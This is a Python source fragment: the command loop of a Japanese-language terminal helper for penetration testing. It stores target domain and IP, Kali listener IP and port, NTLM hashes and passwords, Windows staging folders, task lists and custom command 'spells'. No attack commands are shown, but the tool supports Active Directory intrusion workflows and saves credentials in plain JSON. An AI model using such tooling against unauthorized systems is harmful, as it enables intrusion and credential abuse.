            state["domain"]    = get_input_edit("Domain Name",   state["domain"])
            state["dc_ip"]     = get_input_edit("Target IP",     state["dc_ip"])
            state["kali_ip"]   = get_input_edit("Kali IP",       state["kali_ip"])
            state["kali_port"] = get_input_edit("Kali Port",     state["kali_port"])
            state["ntlm"]      = get_input_edit("NTLM Hash",     state["ntlm"])
            current_slot_name  = None

            # AD 環境変数
            ans_ad = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}AD 環境の変数も設定する？ {C_SKY}(y/n){C_LOTUS} ➯ {C_RESET}")).strip().lower()
            if ans_ad == "y":
                state["ns_ip"] = get_input_edit("NS IP (ネームサーバー)", state.get("ns_ip", ""))

            # Windows 作業フォルダ
            ans_win = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}Windows 作業フォルダを変更する？ {C_SKY}(y/n){C_LOTUS} ➯ {C_RESET}")).strip().lower()
            if ans_win == "y":
                me_val = state["me"]
                presets = [
                    r"C:\Users\Public\homedir",
                    r"C:\Windows\Temp\homedir",
                    f"C:\\Users\\{me_val}\\AppData\\Local\\Temp\\homedir",
                ]
                print(f"\n  {C_SILVER}Windows 作業フォルダを選択:{C_RESET}")
                for i, p in enumerate(presets, 1):
                    print(f"  {C_DIM}{i}.{C_RESET}  {C_SKY}{p}{C_RESET}")
                win_input = get_input_edit("番号 or 直接入力", state.get("win_home", presets[0]))
                try:
                    wi = int(win_input) - 1
                    if 0 <= wi < len(presets):
                        state["win_home"] = presets[wi]
                    else:
                        state["win_home"] = win_input
                except ValueError:
                    state["win_home"] = win_input
            print()

        # ── ls ────────────────────────────────────────────────────────
        elif cmd == "ls":
            tgt = parts[1].lower().rstrip("/") if len(parts) >= 2 else None
            if tgt == "help":
                show_list("ls / cd ヘルプ", _HELP_LS)
            elif tgt in ("..", "."):
                show_list("世界の地図", [(n, d["desc"]) for n, d in DOMAINS.items()])
            elif tgt and tgt in DOMAINS:
                items = list(DOMAINS[tgt]["spells"].items())
                for nm, sp in CUSTOM_SPELLS.items():
                    if sp.get("domain") == tgt:
                        items.append((nm, f"★ {sp.get('title', nm)}"))
                show_list(tgt, items)
            elif tgt:
                print(f"  {C_GOLD}[!] 不明なドメイン: {tgt}{C_RESET}\n")
            elif current_domain:
                items = list(DOMAINS[current_domain]["spells"].items())
                for nm, sp in CUSTOM_SPELLS.items():
                    if sp.get("domain") == current_domain:
                        items.append((nm, f"★ {sp.get('title', nm)}"))
                show_list(current_domain, items)
            else:
                show_list("世界の地図", [(n, d["desc"]) for n, d in DOMAINS.items()])

        # ── cd ────────────────────────────────────────────────────────
        elif cmd == "cd":
            if len(parts) < 2:
                current_domain = None
            elif parts[1].lower() == "help":
                show_list("ls / cd ヘルプ", _HELP_LS)
            else:
                new_domain, err = resolve_path(parts[1], current_domain)
                if err:
                    print(f"  {C_GOLD}[!] {err}{C_RESET}\n")
                else:
                    current_domain = new_domain
                    if current_domain:
                        d = DOMAINS[current_domain]
                        print(f"\n  {C_MIST}{d['desc']} の世界へ踏み込んだ。{C_RESET}")
                        items = list(d["spells"].items())
                        for nm, sp in CUSTOM_SPELLS.items():
                            if sp.get("domain") == current_domain:
                                items.append((nm, f"★ {sp.get('title', nm)}"))
                        show_list(current_domain, items)
                    else:
                        print(f"  {C_MIST}ホームに戻った。{C_RESET}")

        # ── slot ──────────────────────────────────────────────────────
        elif cmd == "slot":
            sub = parts[1].lower() if len(parts) >= 2 else "show"

            if sub == "help":
                show_list("slot ヘルプ", _HELP_SLOT)
            elif sub == "show":
                print(f"\n  {C_GOLD}スロット: {C_WHITE}{current_slot_name or '(未選択)'}{C_RESET}")
                show_kv("現在の値", [
                    ("user",      state["me"]),
                    ("password",  state["my_pw"]),
                    ("domain",    state["domain"]),
                    ("target ip", state["dc_ip"]),
                    ("kali ip",   state["kali_ip"]),
                    ("kali port", state["kali_port"]),
                    ("ntlm",      state["ntlm"] or "(未設定)"),
                    ("ns ip",     state.get("ns_ip") or "(未設定)"),
                    ("win home",  state.get("win_home", "")),
                ])
            elif sub == "list":
                show_slots(slots, current_slot_name)
            elif sub == "add" and len(parts) >= 3 and parts[2] == ".":
                if slots:
                    print(ruler("既存のスロット"))
                    for i, sl in enumerate(slots, 1):
                        print(f"  {C_DIM}{i}.{C_RESET}  {C_SILVER}{sl.get('name','')}{C_RESET}")
                    print(ruler())
                print(_rl(f"  {C_LOTUS}✧ {C_SILVER}[n] 新規作成  /  [番号] 上書き更新{C_LOTUS} ➯ {C_RESET}"), end="")
                choice = input("").strip().lower()
                if choice == "n" or not choice:
                    name = get_input("スロット名", f"slot-{len(slots)+1}")
                    slots.append({**state, "name": name})
                    current_slot_name = name
                    print(f"  {C_GREEN}✓ [{name}] として保存したよ。{C_RESET}\n")
                else:
                    try:
                        idx = int(choice) - 1
                        if 0 <= idx < len(slots):
                            old_name   = slots[idx].get("name", "")
                            slots[idx] = {**state, "name": old_name}
                            current_slot_name = old_name
                            print(f"  {C_GREEN}✓ [{old_name}] を更新したよ。{C_RESET}\n")
                        else:
                            print(f"  {C_GOLD}[!] 無効な番号だよ。{C_RESET}\n")
                    except ValueError:
                        print(f"  {C_GOLD}[!] よくわからなかった。{C_RESET}\n")
            elif sub in ("use", "load"):
                if len(parts) < 3:
                    print(f"  {C_GOLD}[?] slot use <番号 or 名前>{C_RESET}\n")
                    continue
                query = parts[2]
                sl = None
                try:
                    sl = slots[int(query) - 1]
                except (ValueError, IndexError):
                    sl = next((x for x in slots if x.get("name","").lower() == query.lower()), None)
                if sl:
                    for k in ("me", "my_pw", "domain", "dc_ip", "kali_ip", "kali_port", "ntlm", "ns_ip", "win_home"):
                        if k in sl:
                            state[k] = sl[k]
                    current_slot_name = sl.get("name","")
                    print(f"  {C_GREEN}✓ [{current_slot_name}] をロードしたよ。{C_RESET}\n")
                else:
                    print(f"  {C_GOLD}[!] 見つからないよ: {query}  →  slot list で確認{C_RESET}\n")
            else:
                print(f"  {C_GOLD}[?] slot help で確認{C_RESET}\n")

        # ── save ──────────────────────────────────────────────────────
        elif cmd == "save":
            new_data = build_save_data(state, slots, tasks, next_task_id, current_slot_name)
            if not SAVE_FILE.exists():
                ans = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}{SAVE_FILE} が見つからないよ。新規作成する？ {C_SKY}(y/n){C_LOTUS} ➯ {C_RESET}")).strip().lower()
                if ans == "y":
                    write_save(new_data)
                    print(f"  {C_GREEN}✓ {SAVE_FILE} を作成したよ。{C_RESET}\n")
            else:
                old_data    = load_save() or {}
                changes     = compute_diff(old_data, new_data)
                has_changes = display_diff(changes)
                if not has_changes:
                    print(f"  {C_MIST}変更がないからスキップするよ。{C_RESET}\n")
                else:
                    ans = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}保存する？ {C_SKY}(y/n){C_LOTUS} ➯ {C_RESET}")).strip().lower()
                    if ans == "y":
                        write_save(new_data)
                        print(f"  {C_GREEN}✓ セーブしたよ。{C_RESET}\n")
                    else:
                        print(f"  {C_MIST}キャンセルしたよ。{C_RESET}\n")

        # ── export ────────────────────────────────────────────────────
        elif cmd == "export":
            default_name = f"faver_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            fname = parts[1] if len(parts) >= 2 else get_input("エクスポート先", default_name)
            data  = build_save_data(state, slots, tasks, next_task_id, current_slot_name)
            Path(fname).write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
            print(f"  {C_GREEN}✓ {fname} にエクスポートしたよ。{C_RESET}\n")

        # ── task ──────────────────────────────────────────────────────
        elif cmd == "task":
            sub = parts[1].lower() if len(parts) >= 2 else "list"

            if sub == "help":
                show_list("task ヘルプ", _HELP_TASK)
            elif sub in ("list", "ls"):
                show_tasks(tasks)
            elif sub == "add":
                rp   = raw.split(None, 2)
                text = strip_quotes(rp[2]) if len(rp) >= 3 else get_input_edit("タスクの内容")
                if text:
                    tasks.append({"id": next_task_id, "text": text, "done": False})
                    next_task_id += 1
                    print(f"  {C_GREEN}✓ タスク #{len(tasks)} を追加したよ。{C_RESET}\n")
            elif sub == "del":
                try:
                    idx = int(parts[2]) - 1
                    t   = tasks.pop(idx)
                    print(f"  {C_RED}✗ #{idx+1} 「{t['text']}」を削除したよ。{C_RESET}\n")
                except (IndexError, ValueError):
                    print(f"  {C_GOLD}[!] 無効な番号だよ。{C_RESET}\n")
            elif sub == "edit":
                try:
                    idx      = int(parts[2]) - 1
                    new_text = get_input_edit("テキスト", tasks[idx]["text"])
                    if new_text:
                        tasks[idx]["text"] = new_text
                    print(f"  {C_GREEN}✓ タスク #{idx+1} を更新したよ。{C_RESET}\n")
                except (IndexError, ValueError):
                    print(f"  {C_GOLD}[!] 無効な番号だよ。{C_RESET}\n")
            elif sub == "fin":
                try:
                    idx = int(parts[2]) - 1
                    tasks[idx]["done"] = True
                    print(f"  {C_GOLD}✿ #{idx+1} 「{tasks[idx]['text']}」完了！おつかれさま。{C_RESET}\n")
                except (IndexError, ValueError):
                    print(f"  {C_GOLD}[!] 無効な番号だよ。{C_RESET}\n")
            else:
                print(f"  {C_GOLD}[?] task help で確認{C_RESET}\n")

        # ── spell ─────────────────────────────────────────────────────
        elif cmd == "spell":
            handle_spell_cmd(parts, state, CUSTOM_SPELLS, active_handlers)

        # ── help ──────────────────────────────────────────────────────
        elif cmd == "help":
            show_list("旅の手引き", _HELP_MAIN)
            print(f"  {C_DIM}詳細: edit help / ls help / slot help / task help / spell help{C_RESET}\n")

        # ── 術式実行 ──────────────────────────────────────────────────
        else:
            if cmd in active_handlers:
                result = active_handlers[cmd](state)
                if result is not None:
                    title, steps = result
                    if steps:
                        run_step_nav(title, steps)
            else:
                print(f"  {C_GOLD}[!] その術式は知らないんだよね...: {cmd}{C_RESET}\n")

if __name__ == "__main__":
    faber_ui()
